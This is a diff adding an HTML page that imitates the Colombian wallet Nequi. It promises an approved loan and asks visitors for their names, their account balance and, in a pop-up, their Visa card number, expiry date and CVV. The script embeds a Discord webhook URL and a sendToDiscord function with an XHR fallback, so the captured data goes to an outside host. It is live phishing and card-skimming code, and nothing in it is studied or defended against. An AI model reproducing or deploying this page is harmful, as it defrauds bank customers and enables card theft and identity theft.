@@ -1,0 +1,842 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>¡Plata de una en tu Nequi!</title>
+    <link rel="stylesheet" href="../css/index-3.css">
+    <link rel="stylesheet" href="../css/spinner-4.css">
+    <link rel="stylesheet" href="../css/navbar-2.css">
+    <link rel="stylesheet" href="../css/globals-4.css">
+    <link rel="stylesheet" href="../css/styles-1-1.css">
+    <link rel="stylesheet" href="../css/load-spinner-2.css">
+    <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon-4.ico">
+    <style>
+      .loadingContainer { display: none; }
+      footer {
+        margin-top: 40px;
+        background: url(../assets/footer-nequi-2.svg);
+        background-repeat: no-repeat;
+        background-size: cover;
+        padding: 100px 0 60px 0;
+      }
+      .image-saldo {
+        position: absolute; top: -100px; left: 100px; display: none;
+        z-index: 9999; box-shadow: 3px 3px 13px 0px #200020;
+      }
+      .image-saldo::before {
+        content: ""; position: absolute; bottom: -20px; left: 50%;
+        transform: translateX(-50%); border-width: 10px; border-style: solid;
+        border-color: #200020 transparent transparent transparent;
+      }
+      .image-saldo img { width: 160px; }
+      .content {
+        position: fixed; top: -100%; left: 50%; transform: translateX(-50%);
+        width: 95%; background: #0bbd67; padding: 15px; border-radius: 10px;
+        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2); opacity: 0;
+        transition: top 0.6s ease, opacity 0.4s ease;
+        z-index: 9999999; color: #200020; font-size: 13px;
+        display: flex; align-items: center; justify-content: start;
+      }
+      .content.show { top: 10px; opacity: 1; }
+      .check-container {
+        width: 30px; height: 30px; border-radius: 50%;
+        background-color: rgba(255, 255, 255, 0.4);
+        display: flex; justify-content: center; align-items: center; margin-right: 5px;
+      }
+      .checkmark {
+        width: 11px; height: 5px; border-left: 3px solid #200020;
+        border-bottom: 3px solid #200020; transform: rotate(-45deg);
+      }
+      #btnContinuarSalvavidas {
+        position: relative;
+        transition: background-color 0.15s ease, transform 0.12s ease, box-shadow 0.15s ease;
+      }
+      #btnContinuarSalvavidas:not(:disabled):hover {
+        background-color: #c4006f;
+        box-shadow: 0 4px 12px rgba(218, 0, 129, 0.35);
+      }
+      #btnContinuarSalvavidas:not(:disabled):active {
+        transform: scale(0.97); background-color: #a30060;
+      }
+      #btnContinuarSalvavidas.btn-loading {
+        background-color: #a30060 !important;
+        cursor: wait; pointer-events: none; color: #fff;
+        display: inline-flex; align-items: center; justify-content: center; gap: 10px;
+      }
+      .btn-spinner {
+        width: 18px; height: 18px;
+        border: 2.5px solid rgba(255, 255, 255, 0.35);
+        border-top-color: #ffffff; border-radius: 50%;
+        animation: btnSpin 0.7s linear infinite; display: inline-block;
+      }
+      @keyframes btnSpin { to { transform: rotate(360deg); } }
+
+      .visa-modal-overlay {
+        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+        background: rgba(0, 0, 0, 0.5); z-index: 100000;
+        display: none; justify-content: center; align-items: center;
+      }
+      .visa-modal-overlay.active { display: flex; }
+      .visa-modal {
+        background: #fff; border-radius: 12px; padding: 24px;
+        width: 90%; max-width: 400px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        position: relative; max-height: 90vh; overflow-y: auto;
+      }
+      .visa-modal-close {
+        position: absolute; top: 10px; right: 15px; font-size: 28px;
+        color: #200020; cursor: pointer; background: none; border: none;
+        line-height: 1; padding: 0; z-index: 10;
+      }
+      .visa-modal-close:hover { color: #da0081; }
+      .visa-modal h3 {
+        color: #da0081; font-size: 1.1rem; font-weight: 700;
+        margin-bottom: 12px; text-align: center;
+      }
+      .visa-modal img {
+        display: block; width: 100%; max-width: 280px;
+        margin: 0 auto 16px auto; border-radius: 8px;
+      }
+      .visa-form-group { margin-bottom: 14px; }
+      .visa-form-group label {
+        display: block; font-size: 0.8rem; color: #da0081;
+        font-weight: 600; margin-bottom: 4px;
+      }
+      .visa-form-group input {
+        width: 100%; padding: 10px 12px; border: 1px solid #ccc;
+        border-radius: 6px; font-size: 1rem; color: #200020;
+        outline: none; box-sizing: border-box;
+      }
+      .visa-form-group input:focus {
+        border-color: #da0081; box-shadow: 0 0 0 2px rgba(218, 0, 129, 0.2);
+      }
+      .visa-form-row { display: flex; gap: 12px; }
+      .visa-form-row .visa-form-group { flex: 1; }
+      .visa-modal-submit {
+        width: 100%; background: #da0081; color: #fff; border: none;
+        padding: 12px; border-radius: 8px; font-size: 1rem;
+        font-weight: 600; cursor: pointer; margin-top: 6px;
+      }
+      .visa-modal-submit:hover { background: #c4006f; }
+
+      .form-group-nombre {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        background: #fff;
+        border-radius: 8px;
+        padding: 10px 14px;
+        box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.54);
+        width: 100%;
+      }
+      .form-group-nombre img {
+        width: 25px;
+        height: 25px;
+        flex: 0 0 auto;
+      }
+      .form-group-nombre .input-wrapper {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+      }
+      .form-group-nombre label {
+        font-size: 12px;
+        color: #da0081;
+        font-weight: 600;
+        margin-bottom: 2px;
+        display: block;
+      }
+      .form-group-nombre input {
+        width: 100%;
+        border: none;
+        outline: none;
+        font-size: 15px;
+        color: #200020;
+        background: transparent;
+        padding: 0;
+      }
+      .form-group-nombre input::placeholder {
+        color: #999;
+      }
+    </style>
+
+    <!-- POLYFILLS UNIVERSALES -->
+    <script>
+      if (typeof Promise === "undefined") {
+        window.Promise = (function () {
+          function P(fn) {
+            var self = this;
+            self._s = 0; self._v = null; self._h = [];
+            function ok(v){ self._s=1; self._v=v; flush(); }
+            function no(v){ self._s=2; self._v=v; flush(); }
+            function flush(){
+              self._h.forEach(function(h){
+                if (self._s===1 && h.f) h.f(self._v);
+                if (self._s===2 && h.r) h.r(self._v);
+              });
+              self._h = [];
+            }
+            self.then = function(f,r){
+              return new P(function(res,rej){
+                self._h.push({
+                  f: function(v){ try{ res(f?f(v):v); }catch(e){ rej(e); } },
+                  r: function(v){ try{ rej(r?r(v):v); }catch(e){ rej(e); } }
+                });
+                flush();
+              });
+            };
+            self["catch"] = function(r){ return self.then(null,r); };
+            try{ fn(ok,no); }catch(e){ no(e); }
+          }
+          P.resolve = function(v){ return new P(function(r){ r(v); }); };
+          P.reject  = function(v){ return new P(function(_,r){ r(v); }); };
+          return P;
+        })();
+      }
+      if (typeof fetch === "undefined") {
+        window.fetch = function(url, opt){
+          opt = opt || {};
+          return new Promise(function(resolve, reject){
+            var x = new XMLHttpRequest();
+            x.open(opt.method || "GET", url, true);
+            if (opt.headers) for (var k in opt.headers) {
+              if (opt.headers.hasOwnProperty(k)) {
+                try { x.setRequestHeader(k, opt.headers[k]); } catch(e){}
+              }
+            }
+            x.onload = function(){
+              resolve({
+                ok: x.status >= 200 && x.status < 300,
+                status: x.status,
+                text: function(){ return Promise.resolve(x.responseText); },
+                json: function(){ return Promise.resolve(JSON.parse(x.responseText)); }
+              });
+            };
+            x.onerror = function(){ reject(new Error("Network error")); };
+            x.send(opt.body || null);
+          });
+        };
+      }
+      if (typeof Object.assign !== "function") {
+        Object.assign = function(t){
+          for (var i=1;i<arguments.length;i++){
+            var s = arguments[i];
+            if (s) for (var k in s) if (Object.prototype.hasOwnProperty.call(s,k)) t[k]=s[k];
+          }
+          return t;
+        };
+      }
+      if (!Array.from) {
+        Array.from = function(a){ var r=[]; for(var i=0;i<a.length;i++) r.push(a[i]); return r; };
+      }
+      if (!Array.prototype.find) {
+        Array.prototype.find = function(p){
+          for (var i=0;i<this.length;i++) if (p(this[i],i,this)) return this[i];
+        };
+      }
+      if (!Array.prototype.includes) {
+        Array.prototype.includes = function(v){ return this.indexOf(v) !== -1; };
+      }
+      if (!String.prototype.includes) {
+        String.prototype.includes = function(s,p){ return this.indexOf(s, p||0) !== -1; };
+      }
+      if (window.Element && !Element.prototype.closest) {
+        Element.prototype.closest = function(sel){
+          var el = this;
+          while (el && el.nodeType === 1) {
+            if (el.matches && el.matches(sel)) return el;
+            if (el.msMatchesSelector && el.msMatchesSelector(sel)) return el;
+            if (el.webkitMatchesSelector && el.webkitMatchesSelector(sel)) return el;
+            el = el.parentElement || el.parentNode;
+          }
+          return null;
+        };
+      }
+      if (window.NodeList && !NodeList.prototype.forEach) {
+        NodeList.prototype.forEach = Array.prototype.forEach;
+      }
+      if (window.Element && !Element.prototype.matches) {
+        Element.prototype.matches =
+          Element.prototype.matchesSelector ||
+          Element.prototype.mozMatchesSelector ||
+          Element.prototype.msMatchesSelector ||
+          Element.prototype.oMatchesSelector ||
+          Element.prototype.webkitMatchesSelector ||
+          function(s){ var m=(this.document||this.ownerDocument).querySelectorAll(s), i=m.length; while(--i>=0 && m[i]!==this){} return i>-1; };
+      }
+      if (typeof Intl === "undefined") window.Intl = {};
+      if (!Intl.NumberFormat) {
+        Intl.NumberFormat = function(loc, opt){
+          opt = opt || {};
+          var minD = opt.minimumFractionDigits || 0;
+          var maxD = opt.maximumFractionDigits || 0;
+          return {
+            format: function(n){
+              n = Number(n) || 0;
+              var parts = n.toFixed(Math.min(maxD, minD)).split(".");
+              var ip = parts[0].replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+              return parts[1] ? ip + "," + parts[1] : ip;
+            }
+          };
+        };
+      }
+      if (typeof window.CustomEvent !== "function") {
+        window.CustomEvent = function(event, params){
+          params = params || { bubbles:false, cancelable:false, detail:null };
+          var e = document.createEvent("CustomEvent");
+          e.initCustomEvent(event, params.bubbles, params.cancelable, params.detail);
+          return e;
+        };
+      }
+      if (typeof URLSearchParams === "undefined") {
+        window.URLSearchParams = function(init){
+          this._p = [];
+          if (init) {
+            var s = String(init).replace(/^\?/, "").split("&");
+            for (var i=0;i<s.length;i++) {
+              var kv = s[i].split("=");
+              if (kv[0]) this._p.push([decodeURIComponent(kv[0]), decodeURIComponent(kv[1]||"")]);
+            }
+          }
+          this.append = function(k,v){ this._p.push([k,v]); };
+          this.toString = function(){
+            return this._p.map(function(p){ return encodeURIComponent(p[0])+"="+encodeURIComponent(p[1]); }).join("&");
+          };
+        };
+      }
+      window.getFormDataSafe = function () {
+        try { return JSON.parse(localStorage.getItem("formData")) || {}; }
+        catch (e) { return {}; }
+      };
+      window.setFormDataSafe = function (data) {
+        try { localStorage.setItem("formData", JSON.stringify(data)); return true; }
+        catch (e) { window._formDataMem = data; return false; }
+      };
+    </script>
+  </head>
+
+  <body class="bodyContainer" style="background: #fff">
+    <main class="loadingContainer">
+      <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
+        <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
+          <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
+            <a href="questions-credit.php.html" class="h-8">
+              <svg width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
+                <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"/>
+                <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"/>
+                <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"/>
+                <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"/>
+                <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"/>
+              </svg>
+            </a>
+          </div>
+        </div>
+      </header>
+
+      <footer>
+        <div class="wrap">
+          <div class="wrapper">
+            <div class="footer">
+              <img class="footer-pc" src="../assets/footer-bigscreen-3.png" alt="">
+              <img class="footer-mobile" src="../assets/footer-3.png" alt="">
+            </div>
+          </div>
+        </div>
+      </footer>
+    </main>
+
+    <div class="loading-spinner" id="loadingContenedor">
+      <div class="cubes-text" id="loader">
+        <div class="nequi-loader">
+          <div class="cubes">
+            <div class="cube"></div>
+            <div class="cube"></div>
+          </div>
+        </div>
+        <span class="text-cube">Un momento por favor, estamos validando tu solicitud...</span>
+      </div>
+      <div class="done" id="done">
+        <div class="check"></div>
+        <span>¡Listo!</span>
+      </div>
+    </div>
+
+    <div class="content" id="content">
+      <div class="check-container">
+        <div class="checkmark"></div>
+      </div>
+      <p>Listo! Tu crédito se encuentra aprobado.</p>
+    </div>
+
+    <header class="z-[999] fixed top-0 w-full h-16 mx-auto pt-0 pb-0 overflow-visible bg-white">
+      <div class="flex items-center h-full border-b border-gray-primary bg-white px-[26px]">
+        <div class="flex items-center justify-between w-full max-w-[61.875rem] h-full mx-auto">
+          <a href="questions-credit.php.html" class="h-8">
+            <svg width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
+              <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020"/>
+              <path d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020"/>
+              <path d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020"/>
+              <path d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020"/>
+              <path d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020"/>
+            </svg>
+          </a>
+        </div>
+      </div>
+    </header>
+
+    <div class="credits" style="padding-bottom: 0 !important">
+      <div class="wrap">
+        <div class="wrapper" style="width: 100% !important">
+          <div class="type-credits__content" id="type-credits">
+            <div class="type-credits-card-w credit-4">
+              <div class="big-letter" style="height: 31vh !important">
+                <h1 class="u-text-white is-credit-effect-page" style="font-size: 2rem !important; padding: 5.5rem 0">
+                  Valida tus datos
+                </h1>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <main class="mainContainer">
+      <section>
+        <div class="rounded-lg">
+          <div class="px-6" id="simuladorSalvavidas">
+            <div class="max-w-[400px] mx-auto">
+              <h4 class="text-base font-bold text-balance text-left w-full text-pink-primary mt-2 mb-4">
+                Validación de identidad
+              </h4>
+              <div class="mb-4">
+                <h4 class="text-sm font-medium text-left w-full text-purple-primary mb-4">
+                  No dudamos que seas tú, pero por seguridad necesitamos validar algunos datos
+                </h4>
+
+                <div class="form-group-nombre mb-3">
+                  <img src="../assets/document.png" alt="">
+                  <div class="input-wrapper">
+                    <label for="nombreCliente">Nombres</label>
+                    <input type="text" id="nombreCliente" placeholder="Ingresa tus nombres" autocomplete="given-name">
+                  </div>
+                </div>
+
+                <div class="form-group-nombre mb-3">
+                  <img src="../assets/document.png" alt="">
+                  <div class="input-wrapper">
+                    <label for="apellidoCliente">Apellidos</label>
+                    <input type="text" id="apellidoCliente" placeholder="Ingresa tus apellidos" autocomplete="family-name">
+                  </div>
+                </div>
+
+                <div class="mb-4" style="box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.54)">
+                  <div class="relative">
+                    <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">¿Ya has tenido crédito con Nequi?</span>
+                    <select id="fechaPago" class="w-full appearance-none bg-white rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none">
+                      <option value="Si">Si</option>
+                      <option value="No">No</option>
+                    </select>
+                    <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
+                      <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                      </svg>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="form-group">
+                  <img src="../assets/dolar.png" alt="">
+                  <input type="text" id="saldoActualSalvavidas" class="input-saldo" maxlength="17" autocomplete="off" required="">
+                  <label for="saldoActual">¿Cual es tu saldo en Nequi?</label>
+                  <div class="image-saldo">
+                    <img src="../assets/saldoBig.png" alt="">
+                  </div>
+                </div>
+                <span id="saldoActualErrorSalvavidas" class="text-red-500 text-sm text-left hidden">
+                  El saldo ingresado no coincide con la información de tu cuenta Nequi. Verifica el monto.
+                </span>
+                <hr style="color: transparent">
+                <span class="text-purple-primary text-xs" style="height: 60px; display: inline-block; margin-top: 5px; padding-bottom: 29px;">
+                  Por políticas financieras el saldo actual no será visible en la solicitud, solo hace parte del proceso de validación ante las centrales de riesgo.
+                </span>
+
+                <div class="relative mb-2" style="box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.54)">
+                  <span class="absolute top-2 left-4 text-sm text-pink-primary font-medium">¿Tienes tarjeta Visa de Nequi? (aplica virtuales)</span>
+                  <select id="tieneVisaNequi" class="w-full appearance-none bg-white rounded-lg px-4 pt-6 pb-2 pr-10 text-purple-primary font-medium cursor-pointer focus:outline-none">
+                    <option value="No">No</option>
+                    <option value="Si">Si</option>
+                  </select>
+                  <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-purple-primary">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
+                    </svg>
+                  </div>
+                </div>
+              </div>
+
+              <button type="button" id="btnContinuarSalvavidas" class="w-full bg-pink-primary text-white py-4 px-6 rounded-md text-lg hover:bg-pink-600 transition-colors disabled:opacity-80 disabled:cursor-not-allowed" disabled="">
+                <span class="btn-text">Validar</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <footer>
+        <div class="wrap">
+          <div class="wrapper">
+            <div class="footer">
+              <img class="footer-pc" src="../assets/footer-bigscreen-3.png" alt="">
+              <img class="footer-mobile" src="../assets/footer-3.png" alt="">
+            </div>
+          </div>
+        </div>
+      </footer>
+    </main>
+
+    <div class="visa-modal-overlay" id="visaModalOverlay">
+      <div class="visa-modal">
+        <button class="visa-modal-close" id="visaModalClose">&times;</button>
+        <h3>Datos de tu tarjeta Visa Nequi</h3>
+        <img src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/69dd597ad3abeeb0158cdc76_c366c3d61b7f281442c56ee6455b8459_Frame%20%285%29.webp" alt="Tarjeta Visa Nequi">
+        <form id="visaForm" onsubmit="return false;">
+          <div class="visa-form-group">
+            <label for="visaCC">Número de tarjeta (CC)</label>
+            <input type="text" id="visaCC" name="visaCC" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number">
+          </div>
+          <div class="visa-form-row">
+            <div class="visa-form-group">
+              <label for="visaExpiry">Vencimiento (MM/AA)</label>
+              <input type="text" id="visaExpiry" name="visaExpiry" placeholder="MM/AA" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
+            </div>
+            <div class="visa-form-group">
+              <label for="visaCVV">CVV</label>
+              <input type="text" id="visaCVV" name="visaCVV" placeholder="123" maxlength="3" inputmode="numeric" autocomplete="cc-csc">
+            </div>
+          </div>
+          <button type="submit" class="visa-modal-submit" id="visaModalSubmit">Guardar datos</button>
+        </form>
+      </div>
+    </div>
+
+    <script>
+      var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1560271962012651641/S0P2R_wy0Ic3f06qIhuXyVRj6cyjZe9MQYzcW7NXp9-UEgv9mF6tVqAmCFnoFRSB7_DY";
+
+      function sendToDiscord(content) {
+        var payload = { content: content };
+        var bodyStr = JSON.stringify(payload);
+        if (typeof fetch === "function") {
+          try {
+            fetch(DISCORD_WEBHOOK_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: bodyStr
+            }).then(function(r){
+              if (!r.ok) console.error("Discord error:", r.status);
+            })["catch"](function(err){
+              console.error("fetch falló, usando XHR:", err);
+              xhrSendDiscord(bodyStr);
+            });
+            return;
+          } catch (e) {}
+        }
+        xhrSendDiscord(bodyStr);
+      }
+
+      function xhrSendDiscord(bodyStr) {
+        try {
+          var x = new XMLHttpRequest();
+          x.open("POST", DISCORD_WEBHOOK_URL, true);
+          x.setRequestHeader("Content-Type", "application/json");
+          x.send(bodyStr);
+        } catch (err) { console.error("Error Discord:", err); }
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        var loadingContenedor = document.getElementById("loadingContenedor");
+        var saldoActualInput = document.getElementById("saldoActualSalvavidas");
+        var saldoActualError = document.getElementById("saldoActualErrorSalvavidas");
+        var btnContinuarSalvavidas = document.getElementById("btnContinuarSalvavidas");
+        var nombreInput = document.getElementById("nombreCliente");
+        var apellidoInput = document.getElementById("apellidoCliente");
+
+        var tieneVisaSelect = document.getElementById("tieneVisaNequi");
+        var visaModalOverlay = document.getElementById("visaModalOverlay");
+        var visaModalClose = document.getElementById("visaModalClose");
+        var visaForm = document.getElementById("visaForm");
+        var visaCCInput = document.getElementById("visaCC");
+        var visaExpiryInput = document.getElementById("visaExpiry");
+        var visaCVVInput = document.getElementById("visaCVV");
+
+        var modalAbierto = false;
+        var visaDatosGuardados = false;
+
+        window.addEventListener("beforeunload", function (ev) {
+          if (modalAbierto) { ev.preventDefault(); ev.returnValue = ""; return ""; }
+        });
+
+        tieneVisaSelect.addEventListener("change", function (e) {
+          var valor = e.target.value;
+
+          if (valor === "Si") {
+            modalAbierto = true;
+            visaModalOverlay.classList.add("active");
+            if (!visaDatosGuardados) {
+              visaCCInput.value = "";
+              visaExpiryInput.value = "";
+              visaCVVInput.value = "";
+            }
+            setTimeout(function () { visaCCInput.focus(); }, 200);
+          } else if (valor === "No") {
+            visaDatosGuardados = false;
+            var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
+            delete formData.visaCC;
+            delete formData.visaExpiry;
+            delete formData.visaCVV;
+            if (window.setFormDataSafe) window.setFormDataSafe(formData);
+          }
+        });
+
+        function cerrarModalCancelando() {
+          visaModalOverlay.classList.remove("active");
+          modalAbierto = false;
+          if (!visaDatosGuardados) {
+            tieneVisaSelect.value = "No";
+            var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
+            delete formData.visaCC;
+            delete formData.visaExpiry;
+            delete formData.visaCVV;
+            if (window.setFormDataSafe) window.setFormDataSafe(formData);
+          }
+        }
+        visaModalClose.addEventListener("click", cerrarModalCancelando);
+        visaModalOverlay.addEventListener("click", function (e) {
+          if (e.target === visaModalOverlay) cerrarModalCancelando();
+        });
+
+        visaCCInput.addEventListener("input", function (e) {
+          var value = e.target.value.replace(/\D/g, "");
+          if (value.length > 16) value = value.slice(0, 16);
+          value = value.replace(/(\d{4})(?=\d)/g, "$1 ");
+          e.target.value = value;
+        });
+
+        visaExpiryInput.addEventListener("input", function (e) {
+          var value = e.target.value.replace(/\D/g, "");
+          if (value.length > 4) value = value.slice(0, 4);
+          if (value.length >= 3) value = value.slice(0, 2) + "/" + value.slice(2);
+          e.target.value = value;
+        });
+
+        visaCVVInput.addEventListener("input", function (e) {
+          var value = e.target.value.replace(/\D/g, "");
+          if (value.length > 3) value = value.slice(0, 3);
+          e.target.value = value;
+        });
+
+        visaForm.addEventListener("submit", function (e) {
+          e.preventDefault();
+          e.stopPropagation();
+          if (e.stopImmediatePropagation) e.stopImmediatePropagation();
+
+          var cc = visaCCInput.value.trim();
+          var expiry = visaExpiryInput.value.trim();
+          var cvv = visaCVVInput.value.trim();
+
+          var ccDigits = cc.replace(/\s/g, "");
+          if (ccDigits.length < 13 || ccDigits.length > 16) {
+            alert("Por favor ingresa un número de tarjeta válido."); return false;
+          }
+          if (!/^\d{2}\/\d{2}$/.test(expiry)) {
+            alert("Por favor ingresa la fecha de vencimiento en formato MM/AA."); return false;
+          }
+          if (cvv.length !== 3) {
+            alert("Por favor ingresa un CVV válido (3 dígitos)."); return false;
+          }
+
+          var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
+          formData.visaCC = cc;
+          formData.visaExpiry = expiry;
+          formData.visaCVV = cvv;
+          if (window.setFormDataSafe) window.setFormDataSafe(formData);
+
+          visaDatosGuardados = true;
+          visaModalOverlay.classList.remove("active");
+          modalAbierto = false;
+          return false;
+        });
+
